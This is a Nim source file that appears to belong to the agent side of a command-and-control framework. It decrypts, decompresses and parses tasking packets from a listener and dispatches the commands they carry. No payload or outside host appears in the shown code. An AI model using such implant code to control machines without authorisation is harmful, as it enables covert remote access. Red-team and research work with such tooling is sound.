import strutils, tables, json, strformat, zippy

import ./result
import ../../modules/manager
import ../../common/[types, serialize, sequence, crypto, utils]

proc handleTask*(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        return getCommandByType(cast[CommandType](task.command)).execute(ctx, task)
    except CatchableError as err: 
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

proc deserializeTask*(ctx: AgentCtx, bytes: seq[byte]): Task = 

    var unpacker = Unpacker.init(Bytes.toString(bytes))

    let header = unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_TASK)) 

    # Decrypt payload 
    let compressedPayload = unpacker.getBytes(int(header.size))
    let decData = validateDecryption(ctx.sessionKey, header.iv, compressedPayload, header.seqNr, header)

    # Decompress payload 
    let payload = uncompress(decData, dfGzip)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(payload))

    let 
        taskId = unpacker.getUint32()
        listenerId = unpacker.getUint32()
        timestamp = unpacker.getUint32()
        command = unpacker.getUint16()
    
    var argCount = unpacker.getUint8()
    var args = newSeq[TaskArg]() 

    # Parse arguments
    var i = 0
    while i < int(argCount): 
        args.add(unpacker.getArgument())
        inc i

    return Task(
        header: header,
        taskId: taskId,
        listenerId: listenerId, 
        timestamp: timestamp,
        command: command,
        argCount: argCount,
        args: args
    )

proc deserializePacket*(ctx: AgentCtx, packet: string): seq[Task] = 

    result = newSeq[Task]()

    var unpacker = Unpacker.init(packet) 

    var taskCount = unpacker.getUint8()
    echo fmt"[*] Response contained {taskCount} tasks."
    if taskCount <= 0: 
        return @[]

    while taskCount > 0: 

        # Read length of each task and store the task object in a seq[byte]
        let 
            taskLength = unpacker.getUint32() 
            taskBytes = unpacker.getBytes(int(taskLength))

        result.add(ctx.deserializeTask(taskBytes))
        
        dec taskCount